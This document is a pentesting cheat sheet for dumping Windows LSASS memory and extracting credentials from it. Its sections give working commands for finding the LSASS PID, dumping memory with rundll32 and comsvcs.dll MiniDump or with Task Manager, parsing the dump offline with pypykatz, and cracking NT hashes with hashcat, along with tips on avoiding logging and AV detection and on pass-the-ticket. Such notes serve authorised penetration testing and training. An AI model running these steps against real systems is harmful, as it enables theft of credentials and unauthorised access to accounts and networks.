## LSASS Process Identification

Targeting LSASS is necessary to extract sensitive credential material stored in memory by the Local Security Authority Subsystem Service. Identifying the **PID** is required before using CLI-based dumping utilities.

Find PID using standard command prompt

```
tasklist /svc
```

Find PID using PowerShell

```
Get-Process lsass
```

- **Tool comparison**
    - tasklist → `tasklist /svc` → Prefer in restricted cmd shells
    - Get-Process → `Get-Process lsass` → Prefer in PowerShell sessions for cleaner object output

## LSASS GUI Memory Dump

Use when an **interactive graphical session** is available on the target. This allows for a native dump without executing command-line arguments that may be logged.

1. Open Task Manager.
2. Locate `lsass.exe`.
3. Right-click and select **Create dump file**.

- **Gotchas**
    - **Interactive session requirement** means this cannot be performed over a standard shell.

## LSASS CLI Memory Dump

Use when only command-line access is available or a faster dump is required. Requires an **elevated PowerShell session** for execution.

Dumping via native Windows utility and comsvcs.dll

```
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> <FILE_PATH> full
```

- **Gotchas**
    - **AV detection** is highly likely as modern antivirus recognizes the comsvcs.dll MiniDump call as malicious.

## Offline Credential Extraction

Use once a `.dmp` file is transferred to a Linux-based attack host to parse secrets offline and avoid running Mimikatz on the target.

Parse LSASS minidump for hashes and clear-text secrets

```
pypykatz lsa minidump <FILE_PATH>
```

- **Tool comparison**
    
    - pypykatz → `pypykatz lsa minidump <FILE_PATH>` → Prefer for offline analysis on Linux hosts
    - Mimikatz → Internal commands → Only use if Windows-based attack host is available or on-target execution is safe
- **Dangerous / misconfigured settings**
    
    - **WDIGEST enabled**: Older Windows versions or misconfigured modern systems will store credentials in **clear-text** within LSASS.
- **Gotchas**
    
    - **Active logon sessions** must exist at the time of the dump, or no sensitive material will be present in the snapshot.

## NT Hash Cracking

Use when **MSV** authentication package data has been extracted from the LSASS dump and provides NT hashes.

Crack extracted NT hash using a wordlist

```
hashcat -m 1000 <HASH> <FILE_PATH>
```

- **Edge cases**
    - **Kerberos tickets**: If hashes are uncrackable, look for Kerberos ekeys or tickets in the pypykatz output for Pass-the-Ticket attacks.